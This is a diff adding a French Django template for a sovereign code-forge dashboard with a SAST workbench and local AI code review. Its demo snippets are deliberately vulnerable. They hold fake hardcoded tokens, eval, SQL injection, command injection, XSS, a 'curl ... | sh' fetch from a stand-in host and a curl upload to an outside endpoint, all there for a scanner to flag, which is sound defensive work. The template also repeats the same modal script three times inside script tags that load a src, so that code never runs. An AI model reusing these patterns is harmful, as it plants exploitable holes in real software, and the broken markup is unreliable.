@@ -1,0 +1,1089 @@
+{% extends 'base.html' %}
+{% load i18n static %}
+
+{% block extra_head %}
+<!-- CodeMirror (UI-01) -->
+<link rel="stylesheet" href="{% static 'vendor/codemirror/codemirror.min.css' %}">
+<link rel="stylesheet" href="{% static 'vendor/codemirror/theme/material-darker.min.css' %}">
+<script src="{% static 'vendor/codemirror/codemirror.min.js' %}">
+function openNewRepoModal() {
+    const modal = document.getElementById('modalNewRepo');
+    if (modal) modal.style.display = 'flex';
+}
+function closeNewRepoModal() {
+    const modal = document.getElementById('modalNewRepo');
+    if (modal) modal.style.display = 'none';
+}
+async function submitNewDemoRepo() {
+    const name = document.getElementById('modalRepoName').value.trim();
+    const description = document.getElementById('modalRepoDesc').value.trim();
+    const isPrivate = document.getElementById('modalRepoPrivate').checked;
+    const feedback = document.getElementById('modalRepoFeedback');
+    const submitBtn = document.getElementById('btnSubmitNewRepo');
+
+    if (!name) {
+        if (feedback) {
+            feedback.style.display = 'block';
+            feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+            feedback.style.color = '#ef4444';
+            feedback.textContent = '{% trans "Veuillez renseigner un nom de dépôt." %}';
+        }
+        return;
+    }
+
+    if (submitBtn) submitBtn.disabled = true;
+    if (feedback) {
+        feedback.style.display = 'block';
+        feedback.style.background = 'rgba(16, 185, 129, 0.1)';
+        feedback.style.color = '#10b981';
+        feedback.textContent = '{% trans "Création du dépôt sur la forge en cours..." %}';
+    }
+
+    try {
+        const headers = {'Content-Type': 'application/json'};
+        if (window.getCsrfToken && window.getCsrfToken()) {
+            headers['X-CSRFToken'] = window.getCsrfToken();
+        }
+        const res = await fetch('/api/forge/repositories/', {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify({name, description, private: isPrivate})
+        });
+        const data = await res.json();
+        if (res.ok) {
+            feedback.style.background = 'rgba(16, 185, 129, 0.2)';
+            feedback.style.color = '#10b981';
+            feedback.textContent = '{% trans "Dépôt créé avec succès !" %}';
+            if (window.showToast) window.showToast(`Dépôt ${name} créé avec succès !`, 'success');
+            setTimeout(() => {
+                closeNewRepoModal();
+                window.location.reload();
+            }, 1000);
+        } else {
+            feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+            feedback.style.color = '#ef4444';
+            feedback.textContent = data.error || '{% trans "Échec de création du dépôt." %}';
+        }
+    } catch (err) {
+        feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+        feedback.style.color = '#ef4444';
+        feedback.textContent = err.message || '{% trans "Erreur de connexion." %}';
+    } finally {
+        if (submitBtn) submitBtn.disabled = false;
+    }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+    if (window.location.hash === '#new-repo') {
+        setTimeout(openNewRepoModal, 400);
+    }
+});
+
+</script>
+<script src="{% static 'vendor/codemirror/mode/python/python.min.js' %}">
+function openNewRepoModal() {
+    const modal = document.getElementById('modalNewRepo');
+    if (modal) modal.style.display = 'flex';
+}
+function closeNewRepoModal() {
+    const modal = document.getElementById('modalNewRepo');
+    if (modal) modal.style.display = 'none';
+}
+async function submitNewDemoRepo() {
+    const name = document.getElementById('modalRepoName').value.trim();
+    const description = document.getElementById('modalRepoDesc').value.trim();
+    const isPrivate = document.getElementById('modalRepoPrivate').checked;
+    const feedback = document.getElementById('modalRepoFeedback');
+    const submitBtn = document.getElementById('btnSubmitNewRepo');
+
+    if (!name) {
+        if (feedback) {
+            feedback.style.display = 'block';
+            feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+            feedback.style.color = '#ef4444';
+            feedback.textContent = '{% trans "Veuillez renseigner un nom de dépôt." %}';
+        }
+        return;
+    }
+
+    if (submitBtn) submitBtn.disabled = true;
+    if (feedback) {
+        feedback.style.display = 'block';
+        feedback.style.background = 'rgba(16, 185, 129, 0.1)';
+        feedback.style.color = '#10b981';
+        feedback.textContent = '{% trans "Création du dépôt sur la forge en cours..." %}';
+    }
+
+    try {
+        const headers = {'Content-Type': 'application/json'};
+        if (window.getCsrfToken && window.getCsrfToken()) {
+            headers['X-CSRFToken'] = window.getCsrfToken();
+        }
+        const res = await fetch('/api/forge/repositories/', {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify({name, description, private: isPrivate})
+        });
+        const data = await res.json();
+        if (res.ok) {
+            feedback.style.background = 'rgba(16, 185, 129, 0.2)';
+            feedback.style.color = '#10b981';
+            feedback.textContent = '{% trans "Dépôt créé avec succès !" %}';
+            if (window.showToast) window.showToast(`Dépôt ${name} créé avec succès !`, 'success');
+            setTimeout(() => {
+                closeNewRepoModal();
+                window.location.reload();
+            }, 1000);
+        } else {
+            feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+            feedback.style.color = '#ef4444';
+            feedback.textContent = data.error || '{% trans "Échec de création du dépôt." %}';
+        }
+    } catch (err) {
+        feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+        feedback.style.color = '#ef4444';
+        feedback.textContent = err.message || '{% trans "Erreur de connexion." %}';
+    } finally {
+        if (submitBtn) submitBtn.disabled = false;
+    }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+    if (window.location.hash === '#new-repo') {
+        setTimeout(openNewRepoModal, 400);
+    }
+});
+
+</script>
+<script src="{% static 'vendor/codemirror/addon/edit/closebrackets.min.js' %}">
+function openNewRepoModal() {
+    const modal = document.getElementById('modalNewRepo');
+    if (modal) modal.style.display = 'flex';
+}
+function closeNewRepoModal() {
+    const modal = document.getElementById('modalNewRepo');
+    if (modal) modal.style.display = 'none';
+}
+async function submitNewDemoRepo() {
+    const name = document.getElementById('modalRepoName').value.trim();
+    const description = document.getElementById('modalRepoDesc').value.trim();
+    const isPrivate = document.getElementById('modalRepoPrivate').checked;
+    const feedback = document.getElementById('modalRepoFeedback');
+    const submitBtn = document.getElementById('btnSubmitNewRepo');
+
+    if (!name) {
+        if (feedback) {
+            feedback.style.display = 'block';
+            feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+            feedback.style.color = '#ef4444';
+            feedback.textContent = '{% trans "Veuillez renseigner un nom de dépôt." %}';
+        }
+        return;
+    }
+
+    if (submitBtn) submitBtn.disabled = true;
+    if (feedback) {
+        feedback.style.display = 'block';
+        feedback.style.background = 'rgba(16, 185, 129, 0.1)';
+        feedback.style.color = '#10b981';
+        feedback.textContent = '{% trans "Création du dépôt sur la forge en cours..." %}';
+    }
+
+    try {
+        const headers = {'Content-Type': 'application/json'};
+        if (window.getCsrfToken && window.getCsrfToken()) {
+            headers['X-CSRFToken'] = window.getCsrfToken();
+        }
+        const res = await fetch('/api/forge/repositories/', {
+            method: 'POST',
+            headers: headers,
+            body: JSON.stringify({name, description, private: isPrivate})
+        });
+        const data = await res.json();
+        if (res.ok) {
+            feedback.style.background = 'rgba(16, 185, 129, 0.2)';
+            feedback.style.color = '#10b981';
+            feedback.textContent = '{% trans "Dépôt créé avec succès !" %}';
+            if (window.showToast) window.showToast(`Dépôt ${name} créé avec succès !`, 'success');
+            setTimeout(() => {
+                closeNewRepoModal();
+                window.location.reload();
+            }, 1000);
+        } else {
+            feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+            feedback.style.color = '#ef4444';
+            feedback.textContent = data.error || '{% trans "Échec de création du dépôt." %}';
+        }
+    } catch (err) {
+        feedback.style.background = 'rgba(239, 68, 68, 0.15)';
+        feedback.style.color = '#ef4444';
+        feedback.textContent = err.message || '{% trans "Erreur de connexion." %}';
+    } finally {
+        if (submitBtn) submitBtn.disabled = false;
+    }
+}
+
+window.addEventListener('DOMContentLoaded', () => {
+    if (window.location.hash === '#new-repo') {
+        setTimeout(openNewRepoModal, 400);
+    }
+});
+
+</script>
+<style>
+.CodeMirror {
+    font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
+    font-size: 0.9rem;
+    border-radius: 8px;
+    border: 1px solid var(--border-color, #27272a);
+    background-color: var(--bg-secondary, #18181b) !important;
+    color: var(--text-primary, #f4f4f5) !important;
+    min-height: 220px;
+}
+.CodeMirror-gutters {
+    background-color: var(--bg-primary, #09090b) !important;
+    border-right: 1px solid var(--border-color, #27272a) !important;
+}
+.CodeMirror-linenumber {
+    color: var(--text-muted, #71717a) !important;
+}
+.CodeMirror-cursor {
+    border-left: 2px solid var(--accent-color, #10b981) !important;
+}
+</style>
+
+{% endblock %}
+
+{% block content %}
+<nav class="breadcrumbs" aria-label="{% trans 'Fil d Ariane' %}">
+    <a href="{% url 'home' %}">{% icon "landmark" size=14 %} {% trans "Accueil" %}</a>
+    <span class="breadcrumbs-separator">/</span>
+    <span class="breadcrumbs-current" aria-current="page">{% trans "Tableau de Bord" %}</span>
+</nav>
+
+<div class="dashboard-header">
+    <div>
+        <h2>{% trans "Tableau de Bord Souverain BANTUDEVLAB" %}</h2>
+        <p style="color: var(--text-muted);">{% trans "Surveillance de la forge logicielle, sécurité Zero-Trust et assistance IA locale" %}</p>
+    </div>
+    <span class="brand-badge" style="font-size: 0.9rem; padding: 0.4rem 0.8rem;">{% trans "NŒUD SOUVERAIN ACTIF" %}</span>
+</div>
+
+<div class="card-grid dashboard-kpi-grid">
+    <div class="card">
+        <p style="color: var(--text-muted); font-size: 0.85rem;">{% trans "Dépôts Actifs" %}</p>
+        <span class="stat-number">{{ total_repos }}</span>
+    </div>
+    <div class="card">
+        <p style="color: var(--text-muted); font-size: 0.85rem;">{% trans "Identités ZKP" %}</p>
+        <span class="stat-number">{{ identities_count }}</span>
+    </div>
+    <div class="card">
+        <p style="color: var(--text-muted); font-size: 0.85rem;">{% trans "Score de Souveraineté" %}</p>
+        <span class="stat-number">{{ avg_sovereignty }}%</span>
+    </div>
+    <div class="card">
+        <p style="color: var(--text-muted); font-size: 0.85rem;">{% trans "Audits IA Gemma 2 2B" %}</p>
+        <span class="stat-number">{{ interactions_count }}</span>
+    </div>
+</div>
+
+<!-- Bannière Bascule d'Environnement Forge (Gitea / GitLab) -->
+<div class="card forge-switch-banner">
+    <div style="display: flex; align-items: center; gap: 0.8rem; min-width: 0;">
+        {% icon "git-branch" size=22 %}
+        <div style="min-width: 0;">
+            <strong style="color: #10b981;">{% trans "Bascule d'Environnement Forge Souveraine" %}</strong>
+            <p style="margin: 0; font-size: 0.85rem; color: var(--text-muted); word-break: break-word;">{% trans "Accédez directement à vos espaces de dépôts Gitea ou GitLab CE." %} <span style="opacity: 0.8; font-family: monospace; font-size: 0.8rem;">(Gitea : <a href="{{ GITEA_LOGIN_URL|default:BASE_URL_2 }}" target="_blank" rel="noopener noreferrer" style="color: #10b981; text-decoration: underline;">{{ GITEA_LOGIN_URL|default:BASE_URL_2 }}</a>)</span></p>
+        </div>
+    </div>
+    <div class="forge-switch-actions">
+        <a href="{{ GITEA_LOGIN_URL|default:BASE_URL_2 }}" target="_blank" rel="noopener noreferrer" class="btn btn-outline" style="border-color: #10b981; color: #10b981;" title="{% trans 'Connexion directe Gitea' %}">
+            {% icon "git-branch" size=14 %} {% trans "Basculer vers Gitea" %}
+        </a>
+        <a href="{{ GITLAB_URL|default:BASE_URL_2 }}" target="_blank" rel="noopener noreferrer" class="btn btn-primary">
+            {% icon "code" size=14 %} {% trans "Espace GitLab" %}
+        </a>
+    </div>
+</div>
+
+<div class="dashboard-main-grid">
+    <div>
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.5rem; flex-wrap: wrap; gap: 0.5rem;">
+            <h3 style="margin: 0;">{% icon "package" size=18 %} {% trans "Moteur Git Panafricain & Dépôts Souverains" %}</h3>
+            <div style="display: flex; align-items: center; gap: 0.5rem;">
+                <button type="button" class="btn btn-primary" id="btnOpenNewRepoModal" onclick="openNewRepoModal()" style="display: inline-flex; align-items: center; gap: 0.4rem; font-size: 0.85rem; padding: 0.4rem 0.85rem; background: linear-gradient(135deg, #10b981, #059669); border: none; font-weight: 600;">
+                    {% icon "plus-circle" size=16 %} {% trans "Créer un Dépôt de Démonstration" %}
+                </button>
+                <span class="brand-badge" style="font-size: 0.75rem;">{% trans "Données Réelles Gitea API" %}</span>
+            </div>
+        </div>
+        <div class="card table-responsive" style="margin-top: 1rem;">
+            <table style="width: 100%; text-align: left; border-collapse: collapse;">
+                <thead>
+                    <tr style="border-bottom: 1px solid var(--dark-border); color: var(--text-muted);">
+                        <th style="padding: 0.75rem;">{% trans "Dépôt" %}</th>
+                        <th style="padding: 0.75rem;">{% trans "Visibilité" %}</th>
+                        <th style="padding: 0.75rem;">{% trans "Branche" %}</th>
+                        <th style="padding: 0.75rem; text-align: right;">{% trans "Action" %}</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for repo in repos %}
+                    <tr style="border-bottom: 1px solid rgba(255,255,255,0.05);">
+                        <td style="padding: 0.75rem;">
+                            <a href="{{ repo.html_url|default:BASE_URL_2|add:'/'|add:repo.full_name }}" target="_blank" rel="noopener noreferrer" style="color: #10b981; font-weight: 600; text-decoration: none;">
+                                {{ repo.full_name|default:repo.name }}
+                            </a>
+                            {% if repo.description %}
+                            <p style="margin: 0.2rem 0 0; font-size: 0.8rem; color: var(--text-muted);">{{ repo.description }}</p>
+                            {% endif %}
+                        </td>
+                        <td style="padding: 0.75rem;">
+                            {% if repo.private %}<span style="color: #f87171; font-size: 0.8rem;">{% trans "Privé" %}</span>{% else %}<span style="color: var(--secondary-emerald); font-size: 0.8rem;">{% trans "Public Souverain" %}</span>{% endif %}
+                        </td>
+                        <td style="padding: 0.75rem; font-family: monospace; font-size: 0.85rem; color: var(--primary-african-gold);">
+                            {{ repo.default_branch|default:"main" }}
+                        </td>
+                        <td style="padding: 0.75rem; text-align: right;">
+                            <div style="display: inline-flex; gap: 0.4rem; flex-wrap: wrap; justify-content: flex-end;">
+                                <button type="button" class="bantu-pro-action-btn bantu-pro-btn-security" style="padding: 0.25rem 0.55rem; font-size: 0.72rem;" onclick="if(window.openBantuCommandTerminal) window.openBantuCommandTerminal('security', '{{ repo.full_name|default:repo.name }}', '{{ repo.default_branch|default:'main' }}')">
+                                    {% icon "shield" size=12 %} <span class="bantu-i18n-security-label">Run Security Audit</span>
+                                </button>
+                                <button type="button" class="bantu-pro-action-btn bantu-pro-btn-gemma" style="padding: 0.25rem 0.55rem; font-size: 0.72rem;" onclick="if(window.openBantuCommandTerminal) window.openBantuCommandTerminal('gemma', '{{ repo.full_name|default:repo.name }}', '{{ repo.default_branch|default:'main' }}')">
+                                    {% icon "bot" size=12 %} <span class="bantu-i18n-gemma-label">Ask Gemma Review</span>
+                                </button>
+                                <a href="{{ repo.html_url|default:BASE_URL_2|add:'/'|add:repo.full_name }}" target="_blank" rel="noopener noreferrer" class="btn btn-secondary" style="padding: 0.25rem 0.6rem; font-size: 0.75rem;">
+                                    {% icon "external-link" size=12 %} {% trans "Gitea" %}
+                                </a>
+                            </div>
+                        </td>
+                    </tr>
+                    {% empty %}
+                    <tr><td colspan="4" style="padding: 1rem; color: var(--text-muted);">{% trans "Aucun dépôt détecté sur le cluster Gitea local." %}</td></tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <!-- Workbench avec Éditeur de Code Moderne (UI-01) -->
+        <h3 style="margin-top: 2rem; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 0.5rem;">
+            <span>{% trans "Workbench Souverain & Audit SAST" %}</span>
+            <span style="font-size: 0.8rem; color: var(--text-muted); font-weight: normal;">{% trans "Éditeur avec coloration syntaxique & numérotation" %}</span>
+        </h3>
+
+        <div class="card" style="margin-top: 1rem; padding: 1.25rem;">
+            <div class="editor-container">
+                <div class="editor-toolbar">
+                    <div class="file-tag" style="flex-wrap: wrap;">
+                        <span>{% icon "code" size=16 %}</span>
+                        <span id="editorFileNameTag">workbench_security_audit.py</span>
+                        <select class="editor-lang-select" id="editorLangSelect" aria-label="{% trans 'Langage' %}" onchange="changeEditorMode(this.value)">
+                            <option value="python">Python</option>
+                            <option value="dockerfile">Dockerfile</option>
+                            <option value="yaml">YAML</option>
+                            <option value="javascript">JavaScript</option>
+                        </select>
+                    </div>
+                    <div style="display: flex; gap: 0.45rem; align-items: center; flex-wrap: wrap;">
+                        <button type="button" class="btn btn-secondary demo-type-btn" data-demo-type="python" style="padding: 0.2rem 0.55rem; font-size: 0.72rem;" onclick="changeEditorMode('python')">Python</button>
+                        <button type="button" class="btn btn-secondary demo-type-btn" data-demo-type="dockerfile" style="padding: 0.2rem 0.55rem; font-size: 0.72rem;" onclick="changeEditorMode('dockerfile')">Dockerfile</button>
+                        <button type="button" class="btn btn-secondary demo-type-btn" data-demo-type="yaml" style="padding: 0.2rem 0.55rem; font-size: 0.72rem;" onclick="changeEditorMode('yaml')">YAML</button>
+                        <button type="button" class="btn btn-secondary demo-type-btn" data-demo-type="javascript" style="padding: 0.2rem 0.55rem; font-size: 0.72rem;" onclick="changeEditorMode('javascript')">JavaScript</button>
+                        <span id="editorStatus" style="font-size: 0.8rem; color: var(--secondary-emerald);">{% icon "dot" size=10 %} {% trans "Prêt" %}</span>
+                        <button class="btn btn-secondary" style="padding: 0.2rem 0.6rem; font-size: 0.75rem;" onclick="resetEditorSnippet()">{% trans "Snippet Démo" %}</button>
+                    </div>
+                </div>
+                <textarea id="scanCodeInput" class="fallback-code-editor" style="display: none;"></textarea>
+                <div id="codeEditorMount"></div>
+            </div>
+
+            <div style="margin-top: 1.25rem; display: flex; gap: 1rem; flex-wrap: wrap;">
+                <button class="btn btn-primary" onclick="runSecurityScan()">
+                    {% icon "shield" size=18 %} {% trans "Lancer l'Audit de Sécurité" %}
+                </button>
+                <button class="btn btn-secondary" onclick="runAiReview()">
+                    {% icon "bot" size=18 %} {% trans "Demander l'Avis de Gemma" %}
+                </button>
+            </div>
+
+            <!-- Visualisation Graphique Moderne des Résultats (UI-02) -->
+            <div id="visualScanContainer" style="margin-top: 1.5rem; display: none;">
+                <!-- Jauge Circulaire & Statistiques de Souveraineté -->
+                <div class="sovereignty-gauge-card">
+                    <div class="circular-gauge-wrapper">
+                        <svg class="circular-gauge-svg" viewBox="0 0 120 120">
+                            <circle class="gauge-bg-circle" cx="60" cy="60" r="50"></circle>
+                            <circle id="gaugeProgressCircle" class="gauge-progress-circle" cx="60" cy="60" r="50" stroke-dasharray="314.16" stroke-dashoffset="314.16"></circle>
+                        </svg>
+                        <div class="gauge-inner-text">
+                            <div id="gaugeScoreText" class="gauge-percentage">--%</div>
+                            <div class="gauge-sublabel">{% trans "Souveraineté" %}</div>
+                        </div>
+                    </div>
+
+                    <div class="gauge-details-col">
+                        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 0.5rem;">
+                            <div>
+                                <h4 id="scanStatusTitle" style="margin: 0; font-size: 1.15rem;">{% trans "Analyse Complétée" %}</h4>
+                                <p id="scanJurisdiction" style="margin: 0.25rem 0 0; font-size: 0.82rem; color: var(--text-muted);">{% trans "Normes de Souveraineté Numérique ADSS-v1" %}</p>
+                            </div>
+                            <span id="scanStatusBadge" class="brand-badge">{% trans "CONFORME" %}</span>
+                        </div>
+
+                        <div class="metrics-pill-grid">
+                            <div class="metric-pill">
+                                <span id="pillCriticalCount" class="pill-val severity-pill-critical">0</span>
+                                <span class="pill-lbl">{% trans "Critiques" %}</span>
+                            </div>
+                            <div class="metric-pill">
+                                <span id="pillHighCount" class="pill-val severity-pill-high">0</span>
+                                <span class="pill-lbl">{% trans "Hautes" %}</span>
+                            </div>
+                            <div class="metric-pill">
+                                <span id="pillMediumCount" class="pill-val severity-pill-medium">0</span>
+                                <span class="pill-lbl">{% trans "Moyennes" %}</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Liste Interactive des Vulnérabilités -->
+                <div id="vulnerabilitiesListSection">
+                    <h4 style="margin-bottom: 0.75rem; display: flex; align-items: center; justify-content: space-between;">
+                        <span>{% trans "Vulnérabilités & Fuites Détectées" %}</span>
+                        <span id="issuesCountBadge" style="font-size: 0.8rem; color: var(--text-muted);">{% trans "0 problème détecté" %}</span>
+                    </h4>
+                    <div id="vulnerabilitiesContainer"></div>
+                </div>
+            </div>
+
+            <!-- Affichage Revue IA / Streaming SSE -->
+            <div id="aiReviewSection" style="margin-top: 1.5rem; display: none;">
+                <h4 style="margin-bottom: 0.5rem; color: var(--primary-african-gold);">{% trans "Rapport d'Audit Gemma 5B (Local / On-Premise)" %}</h4>
+                <div id="aiReviewContent" style="padding: 1.25rem; background: #080c14; border: 1px solid var(--dark-border); border-radius: 8px; font-family: monospace; font-size: 0.9rem; line-height: 1.6; white-space: pre-wrap; color: #e2e8f0;"></div>
+            </div>
+        </div>
+    </div>
+
+    <div>
+        <h3>{% trans "Audits Récents" %}</h3>
+        <div style="display: flex; flex-direction: column; gap: 1rem; margin-top: 1rem;">
+            {% for audit in audits %}
+            <div class="card" style="padding: 1rem;">
+                <div style="display: flex; justify-content: space-between;">
+                    <strong>{{ audit.repository_name }}</strong>
+                    <span style="color: var(--secondary-emerald); font-weight: bold;">{{ audit.sovereignty_score }}%</span>
+                </div>
+                <p style="font-size: 0.8rem; color: var(--text-muted); margin: 0.3rem 0;">{% trans "Fichier :" %} {{ audit.file_scanned }}</p>
+                <span class="brand-badge" style="font-size: 0.7rem;">{{ audit.status_rating }}</span>
+            </div>
+            {% empty %}
+            <div class="card">
+                <p style="color: var(--text-muted); font-size: 0.9rem;">{% trans "Aucun audit récent enregistré. Lancez un premier scan !" %}</p>
+            </div>
+            {% endfor %}
+        </div>
+    </div>
+</div>
+
+<!-- Modal Creation Depot de Demonstration (CADEV 2026) -->
+<div id="modalNewRepo" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.75); z-index: 10000; align-items: center; justify-content: center; backdrop-filter: blur(4px);">
+    <div style="background: #0d1117; border: 1px solid var(--dark-border); border-radius: 12px; width: 90%; max-width: 520px; padding: 1.75rem; box-shadow: 0 20px 40px rgba(0,0,0,0.6);">
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.25rem;">
+            <h3 style="margin: 0; display: flex; align-items: center; gap: 0.5rem; color: #fff;">
+                {% icon "package" size=20 %} {% trans "Nouveau Dépôt de Démonstration" %}
+            </h3>
+            <button type="button" onclick="closeNewRepoModal()" style="background: none; border: none; color: var(--text-muted); font-size: 1.25rem; cursor: pointer;">{% icon "x" size=20 %}</button>
+        </div>
+        <p style="font-size: 0.85rem; color: var(--text-muted); margin-bottom: 1.25rem;">
+            {% trans "Initialisez un dépôt souverain sur la forge Gitea avec branche principale par défaut et traçabilité dans l'Audit Trail immuable." %}
+        </p>
+        <div style="margin-bottom: 1rem;">
+            <label style="display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 0.35rem; color: #fff;">{% trans "Nom du Dépôt :" %}</label>
+            <input type="text" id="modalRepoName" value="demo-cadev-sovereign" style="width: 100%; padding: 0.65rem; background: #080c14; border: 1px solid var(--dark-border); color: #fff; border-radius: 6px; font-size: 0.95rem; box-sizing: border-box;">
+        </div>
+        <div style="margin-bottom: 1rem;">
+            <label style="display: block; font-size: 0.85rem; font-weight: 600; margin-bottom: 0.35rem; color: #fff;">{% trans "Description :" %}</label>
+            <input type="text" id="modalRepoDesc" value="Dépôt souverain de test créé pour l'évaluation CADEV 2026" style="width: 100%; padding: 0.65rem; background: #080c14; border: 1px solid var(--dark-border); color: #fff; border-radius: 6px; font-size: 0.95rem; box-sizing: border-box;">
+        </div>
+        <div style="margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.5rem;">
+            <input type="checkbox" id="modalRepoPrivate">
+            <label for="modalRepoPrivate" style="font-size: 0.85rem; color: var(--text-muted); cursor: pointer;">{% trans "Dépôt privé (accès restreint à l'organisation)" %}</label>
+        </div>
+        <div id="modalRepoFeedback" style="display: none; padding: 0.6rem; border-radius: 6px; font-size: 0.85rem; margin-bottom: 1rem;"></div>
+        <div style="display: flex; justify-content: flex-end; gap: 0.75rem;">
+            <button type="button" class="btn btn-secondary" onclick="closeNewRepoModal()">{% trans "Annuler" %}</button>
+            <button type="button" class="btn btn-primary" id="btnSubmitNewRepo" onclick="submitNewDemoRepo()" style="background: linear-gradient(135deg, #10b981, #059669); border: none;">
+                {% icon "check" size=16 %} {% trans "Créer le Dépôt Immédiatement" %}
+            </button>
+        </div>
+    </div>
+</div>
+
+{% endblock %}
+
+{% block extra_scripts %}
+<script>
+// CodeMirror Editor Initialization & Multi-Language Vulnerable Demo Snippets (UI-01)
+const DEMO_FILES_META = {
+    python: {
+        filename: "workbench_security_audit.py",
+        cmMode: "python",
+        snippet: `# Workbench Souverain (Python) - Analyse de Sécurité & Souveraineté
+import os
+import requests
+
+# 1. Fuite potentielle de secret souverain (Token hardcodé)
+api_key = "ghp_super_secret_token_123456789012345678"
+
+def process_banking_request(user_input, cursor, account_id):
+    # 2. Utilisation risquée de eval (RCE)
+    result = eval(user_input)
+
+    # 3. Injection SQL par concaténation
+    cursor.execute("SELECT * FROM sovereign_accounts WHERE id = '%s'" % account_id + "")
+
+    # 4. Fuite de télémétrie étrangère non souveraine
+    requests.post("https://foreign-analytics.tracking.com/collect", json={"log": result})
+
+    return result
+`
+    },
+    dockerfile: {
+        filename: "Dockerfile.sovereign",
+        cmMode: "dockerfile",
+        snippet: `# Workbench Souverain (Dockerfile) - Conteneurisation Non Sécurisée
+# 1. Image non épinglée (:latest) et exécution en privilèges root
+FROM ubuntu:latest
+USER root
+
+# 2. Secret exposé en clair dans une directive ENV
+ENV SECRET_KEY="ghp_dockerfile_exposed_secret_9876543210abcdef"
+
+# 3. Exécution distante non vérifiée pipée vers sh & permissions 777
+RUN curl -sSL https://foreign.telemetry.io/bootstrap.sh | sh
+RUN chmod -R 777 /var/www/bantudevlab
+
+CMD ["python3", "manage.py", "runserver", "0.0.0.0:8000"]
+`
+    },
+    yaml: {
+        filename: "gitlab-ci-sovereign.yml",
+        cmMode: "yaml",
+        snippet: `# Workbench Souverain (YAML CI/CD) - Pipeline à Risque
+stages:
+  - security_audit
+  - deploy
+
+sovereign_sast_job:
+  stage: security_audit
+  # 1. Conteneur privilégié et contournement des alertes de sécurité
+  privileged: true
+  allow_failure: true
+  variables:
+    # 2. Token secret exposé en clair dans le fichier YAML
+    AUTH_TOKEN: "ghp_yaml_pipeline_secret_token_1234567890abcdef"
+  script:
+    # 3. Exfiltration vers un endpoint cloud hors juridiction africaine
+    - curl -X POST https://us-east-1.amazonaws.com/telemetry-bucket/upload
+`
+    },
+    javascript: {
+        filename: "workbench_payment_gateway.js",
+        cmMode: "javascript",
+        snippet: `// Workbench Souverain (JavaScript) - Passerelle Paiement Mobile Money
+const child_process = require("child_process");
+
+// 1. Clé API exposée côté client/serveur
+const apiKey = "ghp_js_frontend_exposed_token_1234567890abcdef";
+
+function processMobileTransfer(userInput, formulaExpr) {
+    // 2. Exécution dynamique risquée eval() et injection DOM XSS (innerHTML)
+    const fee = eval(formulaExpr);
+    document.getElementById("transfer-receipt").innerHTML = userInput;
+
+    // 3. Exécution système dangereuse
+    child_process.exec("notify-send " + userInput);
+
+    // 4. Fuite de télémétrie vers un traqueur tiers étranger
+    fetch("https://analytics.tracking.com/beacon", { method: "POST", body: String(fee) });
+    return fee;
+}
+`
+    }
+};
+
+const DEFAULT_SNIPPET = DEMO_FILES_META.python.snippet;
+let currentDemoType = "python";
+let editorInstance = null;
+
+const WORKBENCH_I18N = {
+    fr: {
+        demoLoaded: "Exemple de code vulnérable chargé : ",
+        emptyScan: "Veuillez saisir du code à analyser.",
+        scanningStatus: "Scan en cours...",
+        scanningToast: "Analyse par le moteur de sécurité souverain...",
+        scanError: "Erreur lors du scan",
+        issuesFoundSuffix: "problème(s) identifié(s)",
+        doneStatus: "Terminé",
+        scanSuccessToast: "Audit de sécurité terminé ! Score de souveraineté : ",
+        scannerErrorToast: "Erreur du scanner : ",
+        emptyAi: "Veuillez saisir du code pour l'audit IA.",
+        aiConnecting: "Connexion sécurisée au moteur IA On-Premise Gemma 5B...",
+        aiToastStart: "Consultation de Gemma 5B en cours...",
+        aiHttpError: "Erreur de connexion IA : HTTP ",
+        aiDoneToast: "Revue de code par Gemma 5B complétée.",
+        aiSseError: "Erreur lors du flux IA : ",
+        noVulnTitle: "Aucune vulnérabilité détectée !",
+        noVulnDesc: "Le code respecte strictement les critères de souveraineté panafricaine.",
+        lineLabel: "Ligne",
+        recLabel: "Recommandation Souveraine :"
+    },
+    en: {
+        demoLoaded: "Vulnerable demo snippet loaded: ",
+        emptyScan: "Please enter code to analyze.",
+        scanningStatus: "Scanning...",
+        scanningToast: "Analyzing with the sovereign security scanner...",
+        scanError: "Error during security scan",
+        issuesFoundSuffix: "issue(s) identified",
+        doneStatus: "Completed",
+        scanSuccessToast: "Security audit completed! Sovereignty score: ",
+        scannerErrorToast: "Scanner error: ",
+        emptyAi: "Please enter code for AI review.",
+        aiConnecting: "Connecting securely to On-Premise Gemma 5B AI engine...",
+        aiToastStart: "Querying Gemma 5B AI review stream...",
+        aiHttpError: "AI connection error: HTTP ",
+        aiDoneToast: "Gemma 5B code review completed.",
+        aiSseError: "Error during AI stream: ",
+        noVulnTitle: "No vulnerabilities detected!",
+        noVulnDesc: "The code strictly complies with Pan-African sovereignty standards.",
+        lineLabel: "Line",
+        recLabel: "Sovereign Recommendation:"
+    },
+    sw: {
+        demoLoaded: "Mfano wa msimbo wenye udhaifu umepakiwa: ",
+        emptyScan: "Tafadhali weka msimbo wa kukaguliwa.",
+        scanningStatus: "Inakagua...",
+        scanningToast: "Inachambua kwa injini huru ya usalama...",
+        scanError: "Hitilafu wakati wa ukaguzi",
+        issuesFoundSuffix: "dosari zimetambuliwa",
+        doneStatus: "Imekamilika",
+        scanSuccessToast: "Ukaguzi wa usalama umekamilika! Alama ya uhuru: ",
+        scannerErrorToast: "Hitilafu ya kikaguzi: ",
